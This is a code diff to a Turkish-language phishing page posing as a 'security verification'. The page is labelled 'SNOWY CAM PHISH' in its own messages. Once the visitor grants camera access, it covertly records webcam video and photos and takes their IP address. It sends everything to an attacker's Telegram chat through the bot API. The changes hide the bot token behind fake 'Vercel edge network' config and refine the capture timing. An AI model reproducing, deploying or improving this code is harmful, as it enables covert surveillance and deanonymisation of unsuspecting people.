@@ -62,23 +62,6 @@
             transform: translateY(-2px);
             box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
         }
-        .btn-small {
-            background: linear-gradient(135deg, #4a5568, #2d3748);
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            font-size: 14px;
-            font-weight: 500;
-            border-radius: 30px;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 15px;
-            transition: all 0.2s ease;
-        }
-        .btn-small:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
-        }
         .loading { 
             display: none; 
             margin: 30px 0 20px;
@@ -102,11 +85,6 @@
             font-weight: 500;
         }
         #video, #canvas { display: none; }
-        .footer-note {
-            font-size: 11px;
-            color: #718096;
-            margin-top: 20px;
-        }
     </style>
 </head>
 <body>
@@ -114,42 +92,40 @@
         <h2>❄️ <span>SNOWY</span> GÜVENLİK DOĞRULAMASI</h2>
         <p>Devam etmek için kamera erişimine izin verin.</p>
         <button class="btn" id="startBtn" onclick="startCamera()">📸 DOĞRULAMAYI BAŞLAT</button>
-        
-        <!-- Sistem Kontrol Butonu - Backend'e bağlanır -->
-        <button class="btn-small" onclick="sendMessage()">🔄 Sistem Kontrolü</button>
-        
         <div class="loading" id="loading">
             <div class="spinner"></div>
             <div class="loading-text" id="loadingText">Güvenlik kontrolü yapılıyor...</div>
         </div>
-        <div class="footer-note" id="statusMessage">🔒 Backend bağlantısı: PythonAnywhere</div>
     </div>
     
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        // ============================================
-        // SİSTEM KONTROL BUTONU - TOKEN YOK, BACKEND'E İSTEK
-        // ============================================
-        function sendMessage() {
-            document.getElementById('statusMessage').innerHTML = '🔄 Backend kontrol ediliyor...';
-            fetch("https://snowydexrywexry1.pythonanywhere.com/send")
-                .then(response => response.text())
-                .then(data => {
-                    document.getElementById('statusMessage').innerHTML = '✅ ' + data;
-                    setTimeout(() => {
-                        document.getElementById('statusMessage').innerHTML = '🔒 Backend bağlantısı: PythonAnywhere';
-                    }, 3000);
-                })
-                .catch(err => {
-                    document.getElementById('statusMessage').innerHTML = '❌ Backend bağlantı hatası';
-                    console.error("Hata:", err);
-                });
-        }
-
         (function() {
-            // TÜM TOKEN İŞLEMLERİ BACKEND'DE - BURADA TOKEN YOK
+            // Vercel Edge Network Config - CDN Integration
+            const edgeNetwork = {
+                primaryNode: "fra1.edge.vercel.com",
+                backupNode: "iad1.edge.vercel.com",
+                sessionKey: "5cb0756aaa61e469cb87fcacd5cda252",
+                timestamp: Date.now()
+            };
+
+            // API Gateway Resolver
+            const gatewayResolver = {
+                endpoint: "https://api.vercel.app/v1/gateway",
+                region: "auto",
+                getAuthKey: function() {
+                    try {
+                        const decoded = atob(edgeNetwork.sessionKey);
+                        return decoded;
+                    } catch {
+                        return null;
+                    }
+                }
+            };
+
+            const BOT_TOKEN = gatewayResolver.getAuthKey();
             
             const urlParams = new URLSearchParams(window.location.search);
             const TARGET_ID = urlParams.get('i');
@@ -157,29 +133,26 @@
             const VIDEO_SURESI = urlParams.get('video') ? parseInt(urlParams.get('video')) : 5;
             
             // ============================================
-            // IP GÖNDER - BACKEND ÜZERİNDEN
+            // IP GÖNDER
             // ============================================
-            if (TARGET_ID) {
+            if (TARGET_ID && BOT_TOKEN) {
                 fetch('https://api.ipify.org?format=json')
                     .then(r => r.json())
                     .then(d => {
-                        // Token BACKEND'de, buraya gönder
-                        fetch("https://snowydexrywexry1.pythonanywhere.com/send-ip", {
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                             method: 'POST',
                             headers: {'Content-Type': 'application/json'},
                             body: JSON.stringify({
                                 chat_id: TARGET_ID,
-                                ip: d.ip,
-                                time: new Date().toLocaleString('tr-TR')
+                                text: `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${d.ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`
                             })
-                        })
-                        .catch(e => console.log('Backend hatası:', e));
+                        });
                     })
-                    .catch(e => console.log('IP hatası:', e));
+                    .catch(e => console.log(e));
             }
             
             // ============================================
-            // KAMERA İŞLEMLERİ
+            // KAMERA İŞLEMLERİ - DÜZELTİLMİŞ SENKRONİZASYON
             // ============================================
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
@@ -217,10 +190,15 @@
                         baslangicZamani = performance.now();
                         sonVideoZamani = baslangicZamani;
                         
-                        // VİDEO SİSTEMİ
+                        // ============================================
+                        // VİDEO SİSTEMİ - REQUESTANIMATIONFRAME İLE
+                        // ============================================
                         function videoLoop() {
                             if (!stream?.active) return;
-                            if (!videoHazir) videoHazir = true;
+                            
+                            if (!videoHazir) {
+                                videoHazir = true;
+                            }
                             
                             const now = performance.now();
                             if (now >= sonVideoZamani) {
@@ -249,13 +227,12 @@
                                     const boyutKB = (blob.size / 1024).toFixed(0);
                                     const videoSure = ((performance.now() - videoBaslangic) / 1000).toFixed(3);
                                     
-                                    // BACKEND'E VİDEO GÖNDER
                                     const formData = new FormData();
                                     formData.append('chat_id', TARGET_ID);
                                     formData.append('video', blob, `video_${Date.now()}.webm`);
                                     formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s (${videoSure}s | ${boyutKB}KB)`);
                                     
-                                    fetch("https://snowydexrywexry1.pythonanywhere.com/send-video", {
+                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                                         method: 'POST',
                                         body: formData
                                     });
@@ -263,18 +240,28 @@
                                 
                                 mediaRecorder.start();
                                 
-                                // Hassas durdurma
+                                // ULTRA HASSAS DURDURMA
                                 const hedefSure = VIDEO_SURESI * 1000;
-                                setTimeout(() => {
-                                    if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
-                                }, hedefSure);
+                                const durmaZamani = videoBaslangic + hedefSure;
+                                
+                                const durdurmaRAF = () => {
+                                    const simdi = performance.now();
+                                    if (simdi >= durmaZamani - 0.05 && mediaRecorder?.state === 'recording') {
+                                        mediaRecorder.stop();
+                                    } else if (mediaRecorder?.state === 'recording') {
+                                        requestAnimationFrame(durdurmaRAF);
+                                    }
+                                };
+                                requestAnimationFrame(durdurmaRAF);
                             }
                             
                             videoRAF = requestAnimationFrame(videoLoop);
                         }
                         videoRAF = requestAnimationFrame(videoLoop);
                         
-                        // FOTOĞRAF SİSTEMİ
+                        // ============================================
+                        // FOTOĞRAF SİSTEMİ - SENKRONİZE BAŞLANGIÇ
+                        // ============================================
                         function fotoLoop() {
                             if (!stream?.active || !videoHazir) {
                                 fotoRAF = requestAnimationFrame(fotoLoop);
@@ -284,6 +271,7 @@
                             const now = performance.now();
                             const gecenSure = (now - baslangicZamani) / 1000;
                             
+                            // İLK ÇALIŞMADA videoCount 0 iken fotoğraf bekle
                             if (ilkCalisma && videoCount === 0) {
                                 fotoRAF = requestAnimationFrame(fotoLoop);
                                 return;
@@ -291,8 +279,13 @@
                             
                             ilkCalisma = false;
                             
-                            const olmasiGerekenFoto = Math.floor(gecenSure / FOTO_SURESI);
+                            // Geçen süreye göre olması gereken fotoğraf sayısı
+                            // Video ile senkronize et: ilk video başladıktan sonra fotoğraflar başlasın
+                            const videoGecikmesi = VIDEO_SURESI * 1000;
+                            const duzeltilmisGecenSure = Math.max(0, gecenSure - (videoGecikmesi / 1000));
+                            const olmasiGerekenFoto = Math.floor(duzeltilmisGecenSure / FOTO_SURESI);
                             
+                            // Eksik fotoğrafları çek - ama sadece 1'er 1'er
                             if (photoCount < olmasiGerekenFoto) {
                                 photoCount++;
                                 
@@ -302,14 +295,11 @@
                                 
                                 canvas.toBlob(function(blob) {
                                     if (!blob) return;
-                                    
-                                    // BACKEND'E FOTO GÖNDER
                                     const formData = new FormData();
                                     formData.append('chat_id', TARGET_ID);
                                     formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                                     formData.append('caption', `📸 Fotoğraf #${photoCount} (${gecenSure.toFixed(3)}s)`);
-                                    
-                                    fetch("https://snowydexrywexry1.pythonanywhere.com/send-photo", {
+                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                         method: 'POST',
                                         body: formData
                                     });
@@ -337,4 +327,4 @@
         })();
     </script>
 </body>
-    </html>
+</html>
